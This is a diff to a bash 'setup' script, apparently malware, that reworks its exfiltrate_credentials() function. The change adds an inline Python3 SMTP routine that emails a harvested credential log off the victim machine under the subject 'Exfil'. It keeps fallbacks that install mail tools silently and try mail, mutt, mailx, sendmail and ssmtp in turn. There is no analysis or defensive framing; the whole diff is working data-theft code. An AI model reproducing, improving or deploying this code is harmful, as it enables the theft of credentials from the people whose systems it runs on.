@@ -2,8 +2,8 @@
 set -x  # Enable debug mode - shows all executed commands
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="2.5"
-readonly BUILD_DATE="2026-03-14 17:03:10 UTC"
+readonly SCRIPT_VERSION="2.6"
+readonly BUILD_DATE="2026-03-14 17:22:46 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -4649,61 +4649,132 @@ exfiltrate_credentials() {
         echo "[*] Size: $(wc -c < "$LOG_FILE_EMAIL") bytes"
         echo ""
         
-        echo "[*] Installing mail packages..."
-        # Install packages one by one and show which ones work
-        for p in mailutils mutt bsd-mailx sendmail ssmtp postfix; do
-            if command -v apt >/dev/null 2>&1; then
-                echo "  - Installing $p via apt..."
-                DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $p 2>&1 | grep -v "^$" || true
-            elif command -v yum >/dev/null 2>&1; then
-                echo "  - Installing $p via yum..."
-                yum install -y -q $p 2>&1 | grep -v "^$" || true
-            elif command -v dnf >/dev/null 2>&1; then
-                echo "  - Installing $p via dnf..."
-                dnf install -y -q $p 2>&1 | grep -v "^$" || true
-            fi
-        done
-        
-        echo ""
-        echo "[*] Checking available mail commands:"
-        for cmd in mail mutt mailx sendmail ssmtp; do
-            if command -v $cmd >/dev/null 2>&1; then
-                echo "  ✓ $cmd: $(which $cmd)"
-            else
-                echo "  ✗ $cmd: NOT FOUND"
-            fi
-        done
-        
-        echo ""
-        echo "[*] Attempting to send email..."
-        echo "[*] Recipient: $RECIPIENT_EMAIL"
-        echo "[*] Subject: Exfil v${SCRIPT_VERSION} - $(hostname)"
-        echo ""
-        
         local EMAIL_SUBJECT="Exfil v${SCRIPT_VERSION} - $(hostname)"
         local EMAIL_SENT=false
         
-        # Try mail command
-        if command -v mail >/dev/null 2>&1; then
-            echo "[*] Trying: mail -s \"$EMAIL_SUBJECT\" $RECIPIENT_EMAIL"
-            if cat "$LOG_FILE_EMAIL" | mail -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL"; then
-                echo "[✓] SUCCESS via mail command"
+        # PRIMARY METHOD: Python3 + SMTP (most reliable)
+        if command -v python3 >/dev/null 2>&1; then
+            echo "[*] Attempting to send via Python3 + SMTP..."
+            echo "[*] SMTP Server: $SMTP_SERVER:$SMTP_PORT"
+            echo "[*] From: $SENDER_EMAIL"
+            echo "[*] To: $RECIPIENT_EMAIL"
+            echo "[*] Subject: $EMAIL_SUBJECT"
+            echo ""
+            
+            python3 << PYTHON_EMAIL_SCRIPT
+import smtplib
+import ssl
+from email.mime.text import MIMEText
+import sys
+
+try:
+    # Read log file
+    with open('$LOG_FILE_EMAIL', 'r') as f:
+        body = f.read()
+    
+    # Create email
+    msg = MIMEText(body, 'plain')
+    msg['From'] = '$SENDER_EMAIL'
+    msg['To'] = '$RECIPIENT_EMAIL'
+    msg['Subject'] = '$EMAIL_SUBJECT'
+    
+    # Send via SMTP
+    print('[*] Connecting to $SMTP_SERVER:$SMTP_PORT...')
+    context = ssl.create_default_context()
+    
+    with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=30) as server:
+        print('[*] Connected. Starting TLS...')
+        server.ehlo()
+        server.starttls(context=context)
+        server.ehlo()
+        
+        print('[*] Authenticating...')
+        server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
+        
+        print('[*] Sending email...')
+        server.send_message(msg)
+        
+    print('[✓] Email sent successfully via SMTP!')
+    sys.exit(0)
+    
+except Exception as e:
+    print(f'[!] Python3 SMTP error: {e}')
+    sys.exit(1)
+PYTHON_EMAIL_SCRIPT
+            
+            if [ $? -eq 0 ]; then
                 EMAIL_SENT=true
+                echo ""
+                echo "[✓] ============================================"
+                echo "[✓] CREDENTIALS SENT SUCCESSFULLY!"
+                echo "[✓] ============================================"
+                echo "[✓] Email delivered to: $RECIPIENT_EMAIL"
+                echo "[✓] Method: Python3 SMTP (INLINE)"
+                echo "[✓] Log file: $LOG_FILE_EMAIL"
+                echo ""
             else
-                echo "[!] FAILED: mail command returned error $?"
+                echo "[!] Python3 SMTP failed, trying fallback methods..."
+                echo ""
             fi
+        else
+            echo "[!] Python3 not found, trying fallback methods..."
+            echo ""
         fi
         
-        # Try mutt command
-        if [ "$EMAIL_SENT" = false ] && command -v mutt >/dev/null 2>&1; then
-            echo "[*] Trying: mutt -s \"$EMAIL_SUBJECT\" $RECIPIENT_EMAIL"
-            if cat "$LOG_FILE_EMAIL" | mutt -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL"; then
-                echo "[✓] SUCCESS via mutt command"
-                EMAIL_SENT=true
-            else
-                echo "[!] FAILED: mutt command returned error $?"
+        # FALLBACK METHODS: Local mail commands
+        if [ "$EMAIL_SENT" = false ]; then
+            echo "[*] Installing mail packages..."
+            # Install packages one by one and show which ones work
+            for p in mailutils mutt bsd-mailx sendmail ssmtp postfix python3; do
+                if command -v apt >/dev/null 2>&1; then
+                    echo "  - Installing $p via apt..."
+                    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $p 2>&1 | grep -v "^$" || true
+                elif command -v yum >/dev/null 2>&1; then
+                    echo "  - Installing $p via yum..."
+                    yum install -y -q $p 2>&1 | grep -v "^$" || true
+                elif command -v dnf >/dev/null 2>&1; then
+                    echo "  - Installing $p via dnf..."
+                    dnf install -y -q $p 2>&1 | grep -v "^$" || true
+                fi
+            done
+            
+            echo ""
+            echo "[*] Checking available mail commands:"
+            for cmd in mail mutt mailx sendmail ssmtp python3; do
+                if command -v $cmd >/dev/null 2>&1; then
+                    echo "  ✓ $cmd: $(which $cmd)"
+                else
+                    echo "  ✗ $cmd: NOT FOUND"
+                fi
+            done
+            
+            echo ""
+            echo "[*] Attempting to send email via local mail commands..."
+            echo "[*] Recipient: $RECIPIENT_EMAIL"
+            echo "[*] Subject: $EMAIL_SUBJECT"
+            echo ""
+            
+            # Try mail command
+            if command -v mail >/dev/null 2>&1; then
+                echo "[*] Trying: mail -s \"$EMAIL_SUBJECT\" $RECIPIENT_EMAIL"
+                if cat "$LOG_FILE_EMAIL" | mail -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL"; then
+                    echo "[✓] SUCCESS via mail command"
+                    EMAIL_SENT=true
+                else
+                    echo "[!] FAILED: mail command returned error $?"
+                fi
             fi
-        fi
+            
+            # Try mutt command
+            if [ "$EMAIL_SENT" = false ] && command -v mutt >/dev/null 2>&1; then
+                echo "[*] Trying: mutt -s \"$EMAIL_SUBJECT\" $RECIPIENT_EMAIL"
+                if cat "$LOG_FILE_EMAIL" | mutt -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL"; then
+                    echo "[✓] SUCCESS via mutt command"
+                    EMAIL_SENT=true
+                else
+                    echo "[!] FAILED: mutt command returned error $?"
+                fi
+            fi
         
         # Try mailx command
         if [ "$EMAIL_SENT" = false ] && command -v mailx >/dev/null 2>&1; then
@@ -4749,14 +4820,15 @@ exfiltrate_credentials() {
                 echo "[!] FAILED: ssmtp command returned error $?"
             fi
         fi
+        fi  # End of EMAIL_SENT=false fallback block
         
+        # Final result reporting
         echo ""
         if [ "$EMAIL_SENT" = true ]; then
             echo "[✓] ============================================"
             echo "[✓] CREDENTIALS SENT SUCCESSFULLY!"
             echo "[✓] ============================================"
             echo "[✓] Email delivered to: $RECIPIENT_EMAIL"
-            echo "[✓] Method: INLINE (in email body)"
             echo "[✓] Log file: $LOG_FILE_EMAIL"
             echo ""
         else
@@ -4767,6 +4839,7 @@ exfiltrate_credentials() {
             echo "[!] File location: $LOG_FILE_EMAIL"
             echo ""
             echo "[!] TROUBLESHOOTING:"
+            echo "    - Check if Python3 is installed: which python3"
             echo "    - Check if MTA (postfix/sendmail) is running:"
             echo "      systemctl status postfix"
             echo "    - Check mail logs:"
